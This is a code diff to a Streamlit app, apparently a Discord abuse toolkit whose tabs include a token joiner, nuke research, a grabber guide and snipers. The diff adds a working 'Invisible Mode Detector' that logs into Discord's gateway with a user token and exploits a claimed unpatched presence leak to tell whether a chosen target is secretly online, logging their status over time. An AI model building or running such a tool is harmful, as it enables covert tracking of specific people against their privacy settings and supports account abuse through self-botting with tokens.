@@ -560,7 +560,7 @@ tabs_list = [
     "🏃 Vanity Sniper", "💎 Nitro Sniper", "📝 Message Logger", "📦 Guild Backup",
     "🔗 Token Joiner", "🧅 Tor Manager", "📱 QR Login Kit", "🤖 Android Gen",
     "🎤 Voice Changer", "☢️ Nuke Research", "🕵️ Grabber Guide",
-    "💰 Client Manager", "🚀 Deployment Guide",
+    "💰 Client Manager", "🚀 Deployment Guide","api"
 ]
 tabs = st.tabs(tabs_list)
 
@@ -1743,3 +1743,246 @@ st.subheader("📟 Live Operational Control Terminal Console")
 console_container = st.empty()
 with console_container.container():
     st.code("\n".join(st.session_state.console_logs), language="text")
+# ================= TAB 47: INVISIBLE DETECTOR =================
+with tabs[47]:
+    st.header("👁️ CVE-2026-24332 — Invisible Mode Detector")
+    st.caption("Unpatched privacy leak. Discord's WebSocket gateway includes Invisible users in the `presences` array with `status: \"offline\"`, while genuinely offline users are omitted entirely. This tab exploits that discrepancy to confirm whether a target is actually online behind Invisible mode.")
+
+    st.error("⚠️ **Information disclosure only.** No ATO, no credential access. Discord has not patched this as of the latest advisory.")
+
+    col1, col2 = st.columns(2)
+    with col1:
+        inv_token = st.text_input("Discord Token (account doing the sniffing)", type="password", key="inv_token")
+        inv_target = st.text_input("Target User ID (the Invisible one)", key="inv_target", placeholder="123456789012345678")
+    with col2:
+        inv_guild = st.text_input("Shared Guild ID (both accounts must be in this server)", key="inv_guild", placeholder="123456789012345678")
+        inv_duration = st.slider("Monitor duration (seconds)", 5, 120, 30)
+
+    inv_poll = st.slider("Re-check interval (seconds)", 1, 30, 5)
+
+    col_a, col_b = st.columns(2)
+    with col_a:
+        start_inv = st.button("🔍 Start Invisible Detector", use_container_width=True)
+    with col_b:
+        stop_inv = st.button("🛑 Stop Detector", use_container_width=True)
+
+    if "invisible_detector_running" not in st.session_state:
+        st.session_state.invisible_detector_running = False
+    if "invisible_results" not in st.session_state:
+        st.session_state.invisible_results = []
+
+    if stop_inv:
+        st.session_state.invisible_detector_running = False
+        log_to_console("👁️ Invisible detector stopped.")
+        st.rerun()
+
+    if start_inv:
+        if not inv_token or not inv_target or not inv_guild:
+            st.error("Token, target user ID, and shared guild ID are required.")
+        else:
+            st.session_state.invisible_detector_running = True
+            st.session_state.invisible_results = []
+            log_to_console(f"👁️ Invisible detector armed for target {inv_target} in guild {inv_guild}.")
+
+            import websocket
+            import threading
+
+            GATEWAY = "wss://gateway.discord.gg/?v=9&encoding=json"
+            TARGET = str(inv_target).strip()
+            GUILD = str(inv_guild).strip()
+            TOKEN = inv_token.strip()
+            DURATION = inv_duration
+            POLL = inv_poll
+
+            # ---------- inline websocket listener ----------
+            def _inv_on_open(ws):
+                log_to_console("👁️ Gateway connection opened.")
+
+            def _inv_on_message(ws, message):
+                try:
+                    data = json.loads(message)
+                except:
+                    return
+
+                op = data.get("op")
+
+                # Hello -> send heartbeat + identify
+                if op == 10:
+                    hb_interval = data["d"]["heartbeat_interval"] / 1000.0
+                    threading.Thread(target=_inv_heartbeat, args=(ws, hb_interval), daemon=True).start()
+                    identify_payload = {
+                        "op": 2,
+                        "d": {
+                            "token": TOKEN,
+                            "properties": {
+                                "$os": "windows",
+                                "$browser": "chrome",
+                                "$device": "pc",
+                            },
+                            "compress": False,
+                            "large_threshold": 250,
+                        },
+                    }
+                    ws.send(json.dumps(identify_payload))
+                    log_to_console("👁️ Identify sent.")
+
+                # Dispatch events
+                if op == 0:
+                    t = data.get("t")
+                    d = data.get("d", {})
+
+                    # GUILD_CREATE -> inspect presences array
+                    if t == "GUILD_CREATE" and str(d.get("id")) == GUILD:
+                        presences = d.get("presences", [])
+                        found = False
+                        for p in presences:
+                            uid = str(p.get("user", {}).get("id", ""))
+                            status = p.get("status")
+                            if uid == TARGET and status == "offline":
+                                found = True
+                                entry = {
+                                    "timestamp": datetime.now().strftime("%H:%M:%S"),
+                                    "event": "GUILD_CREATE",
+                                    "status": status,
+                                    "verdict": "🔴 INVISIBLE (actually online)",
+                                }
+                                st.session_state.invisible_results.append(entry)
+                                log_to_console(f"👁️ TARGET {TARGET} found in presences with status=offline -> INVISIBLE.")
+                                break
+                            elif uid == TARGET:
+                                found = True
+                                entry = {
+                                    "timestamp": datetime.now().strftime("%H:%M:%S"),
+                                    "event": "GUILD_CREATE",
+                                    "status": status,
+                                    "verdict": f"🟢 VISIBLE ({status})",
+                                }
+                                st.session_state.invisible_results.append(entry)
+                                log_to_console(f"👁️ TARGET {TARGET} visible as {status}.")
+                                break
+                        if not found:
+                            entry = {
+                                "timestamp": datetime.now().strftime("%H:%M:%S"),
+                                "event": "GUILD_CREATE",
+                                "status": "absent",
+                                "verdict": "⚫ OFFLINE (not in presences)",
+                            }
+                            st.session_state.invisible_results.append(entry)
+                            log_to_console(f"👁️ TARGET {TARGET} absent from presences -> OFFLINE.")
+
+                    # PRESENCE_UPDATE -> live tracking
+                    if t == "PRESENCE_UPDATE":
+                        uid = str(d.get("user", {}).get("id", ""))
+                        status = d.get("status")
+                        if uid == TARGET:
+                            if status == "offline":
+                                verdict = "🔴 INVISIBLE (actually online)"
+                                log_to_console(f"👁️ PRESENCE_UPDATE: target {TARGET} status=offline -> INVISIBLE.")
+                            else:
+                                verdict = f"🟢 VISIBLE ({status})"
+                                log_to_console(f"👁️ PRESENCE_UPDATE: target {TARGET} status={status}.")
+                            st.session_state.invisible_results.append({
+                                "timestamp": datetime.now().strftime("%H:%M:%S"),
+                                "event": "PRESENCE_UPDATE",
+                                "status": status,
+                                "verdict": verdict,
+                            })
+
+            def _inv_heartbeat(ws, interval):
+                while st.session_state.invisible_detector_running:
+                    try:
+                        ws.send(json.dumps({"op": 1, "d": None}))
+                    except:
+                        break
+                    time.sleep(interval)
+
+            def _inv_on_error(ws, error):
+                log_to_console(f"👁️ WebSocket error: {error}")
+
+            def _inv_on_close(ws, code, msg):
+                log_to_console(f"👁️ Gateway closed: {code} {msg}")
+
+            def _inv_run():
+                ws = websocket.WebSocketApp(
+                    GATEWAY,
+                    on_open=_inv_on_open,
+                    on_message=_inv_on_message,
+                    on_error=_inv_on_error,
+                    on_close=_inv_on_close,
+                )
+                ws.run_forever()
+
+            # start listener thread
+            listener = threading.Thread(target=_inv_run, daemon=True)
+            listener.start()
+
+            # monitor window
+            start_time = time.time()
+            monitor = st.empty()
+            while st.session_state.invisible_detector_running and (time.time() - start_time) < DURATION:
+                elapsed = int(time.time() - start_time)
+                monitor.info(f"Monitoring... {elapsed}s / {DURATION}s — {len(st.session_state.invisible_results)} event(s) captured.")
+                time.sleep(POLL)
+
+            st.session_state.invisible_detector_running = False
+            monitor.empty()
+            log_to_console("👁️ Monitor window ended.")
+
+    # ---------- results ----------
+    if st.session_state.invisible_results:
+        st.divider()
+        st.subheader("📊 Detection Results")
+        df = pd.DataFrame(st.session_state.invisible_results)
+        st.dataframe(df, use_container_width=True)
+
+        invisible_hits = sum(1 for r in st.session_state.invisible_results if "INVISIBLE" in r["verdict"])
+        online_hits = sum(1 for r in st.session_state.invisible_results if "VISIBLE" in r["verdict"])
+        offline_hits = sum(1 for r in st.session_state.invisible_results if "OFFLINE" in r["verdict"])
+
+        c1, c2, c3 = st.columns(3)
+        c1.metric("🔴 Invisible", invisible_hits)
+        c2.metric("🟢 Visible", online_hits)
+        c3.metric("⚫ Offline", offline_hits)
+
+        if invisible_hits > 0:
+            st.error("🔴 **Target confirmed INVISIBLE.** They are online but hiding. This is the CVE-2026-24332 leak.")
+        elif online_hits > 0:
+            st.success("🟢 Target is visibly online with a public status.")
+        else:
+            st.info("⚫ Target appears genuinely offline — absent from the presences array.")
+
+    st.divider()
+    with st.expander("ℹ️ How this works / requirements"):
+        st.markdown(
+            """
+**CVE-2026-24332 — Invisible Mode Presence Leak**
+
+- CVSS: **4.3 Medium** — CWE-204 (Observable Response Discrepancy)
+- Status: **Unpatched** as of latest advisory
+- Impact: **Information disclosure only** — privacy bypass, activity tracking
+
+**The discrepancy:**
+- Users set to **Invisible** appear in the gateway `presences` array with `"status": "offline"`
+- Users who are **genuinely offline** are **omitted entirely** from the array
+- Therefore: if the target is in the array with `status: "offline"`, they are actually online but hiding
+
+**Requirements:**
+- Your token must be in a **shared guild** with the target
+- Your account needs the `GUILD_PRESENCES` intent (user accounts typically have this by default)
+- Gateway v9 or v10 — both exhibit the leak
+
+**Detection flow:**
+1. Connect to `wss://gateway.discord.gg/?v=9&encoding=json`
+2. Send Op 2 (Identify) with your token
+3. Capture `GUILD_CREATE` for the shared guild → inspect `presences[]`
+4. Listen for live `PRESENCE_UPDATE` events
+5. Match target ID against the array
+
+**Limitations:**
+- Only works for users sharing a guild with your token
+- If the target never triggers a presence update during your monitor window, only the `GUILD_CREATE` snapshot is available
+- Discord may patch this at any time
+
+**PoC reference:** [github.com/0cqb/CVE-2026-24332](https://github.com/0cqb/CVE-2026-24332)
+            """
+        )
